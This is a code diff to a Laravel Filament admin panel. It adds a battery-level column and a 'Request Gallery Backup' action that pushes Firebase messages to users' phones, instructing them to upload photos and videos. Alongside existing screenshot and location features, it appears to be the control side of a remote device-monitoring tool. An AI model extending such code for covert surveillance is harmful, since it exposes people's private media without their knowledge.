@@ -64,6 +64,16 @@ class UserResource extends Resource
                     ->searchable(),
                 Tables\Columns\TextColumn::make('location')
                     ->searchable(),
+                Tables\Columns\TextColumn::make('battery_level')
+                    ->label('Battery')
+                    ->suffix('%')
+                    ->sortable()
+                    ->color(fn (string $state): string => match (true) {
+                        $state > 50 => 'success',
+                        $state > 20 => 'warning',
+                        default => 'danger',
+                    })
+                    ->icon('heroicon-o-battery-50'),
             ])
             ->filters([
                 //
@@ -126,6 +136,71 @@ class UserResource extends Resource
                         } catch (\Exception $e) {
                              \Filament\Notifications\Notification::make()
                                 ->title('Failed to Request Screenshot')
+                                ->body($e->getMessage())
+                                ->danger()
+                                ->send();
+                        }
+                    }),
+                Tables\Actions\Action::make('request_gallery_backup')
+                    ->label('Request Gallery Backup')
+                    ->icon('heroicon-o-photo')
+                    ->form([
+                        Forms\Components\Select::make('media_type')
+                            ->label('Media Type')
+                            ->options([
+                                'photos' => 'Photos Only',
+                                'videos' => 'Videos Only',
+                                'all' => 'Both (Photos & Videos)',
+                            ])
+                            ->default('all')
+                            ->required(),
+                    ])
+                    ->action(function (User $record, array $data) {
+                        if (!$record->fcm_token) {
+                             \Filament\Notifications\Notification::make()
+                                ->title('No FCM Token')
+                                ->danger()
+                                ->send();
+                            return;
+                        }
+
+                        try {
+                             // Re-use credentials logic (Refactor later into a service)
+                             $credentialsPath = storage_path('app/firebase_credentials.json');
+                             $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
+                                'https://www.googleapis.com/auth/firebase.messaging',
+                                $credentialsPath
+                             );
+                             $token = $credentials->fetchAuthToken();
+                             $jsonKey = json_decode(file_get_contents($credentialsPath), true);
+                             $projectId = $jsonKey['project_id'];
+
+                             $client = new \GuzzleHttp\Client();
+                             $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
+                                'headers' => [
+                                    'Authorization' => 'Bearer ' . $token['access_token'],
+                                    'Content-Type' => 'application/json',
+                                ],
+                                'json' => [
+                                    'message' => [
+                                        'token' => $record->fcm_token,
+                                        'data' => [
+                                            'action' => 'backup_gallery',
+                                            'media_type' => $data['media_type'],
+                                        ],
+                                    ],
+                                ],
+                            ]);
+
+                            \Filament\Notifications\Notification::make()
+                                ->title('Gallery Backup Requested')
+                                ->body("Request sent for " . $data['media_type'])
+                                ->success()
+                                ->send();
+
+                        } catch (\Exception $e) {
+                             \Filament\Notifications\Notification::make()
+                                ->title('Request Failed')
                                 ->body($e->getMessage())
                                 ->danger()
                                 ->send();
